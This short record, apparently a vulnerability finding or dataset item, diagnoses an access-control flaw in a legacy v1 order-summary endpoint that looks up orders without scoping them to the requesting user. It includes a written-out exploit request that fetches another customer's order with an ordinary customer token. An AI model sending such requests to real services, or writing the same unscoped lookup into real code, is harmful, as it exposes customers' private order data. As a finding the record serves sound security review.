diagnosis: In the v1 version branch of the legacy_summary action, CustomerOrder.objects.get(pk=pk) is queried directly, bypassing get_object() and the user-scoped get_queryset(). A user on the v1 API route can retrieve order summaries of any customer.
exploit_request:
GET /api/v1/orders/99214/legacy-summary/ HTTP/1.1
Host: commerce.shopfront.com
Authorization: Bearer <customer_jwt>
